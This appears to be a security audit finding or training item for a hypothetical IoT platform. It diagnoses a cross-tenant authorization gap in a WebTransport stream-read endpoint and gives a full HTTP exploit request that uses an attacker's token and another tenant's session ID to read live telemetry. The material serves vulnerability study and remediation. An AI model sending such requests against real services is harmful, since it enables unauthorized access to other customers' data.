diagnosis: The WebTransport stream inspection endpoint reads data frames buffered on a multiplexed HTTP/3 QUIC connection. It accepts session_id and stream_id from the request body. Although current_user is authenticated, the endpoint fails to verify that session.tenant_id matches current_user.tenant_id. An attacker can supply other tenants' active WebTransport session IDs to read live IoT sensor data and telemetry payloads transmitted over QUIC.
exploit_request:
POST /quic/webtransport/read-stream HTTP/1.1
Host: quic-gateway.iot-platform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"session_id": "wt_sess_fleet_truck_8819", "stream_id": 4}
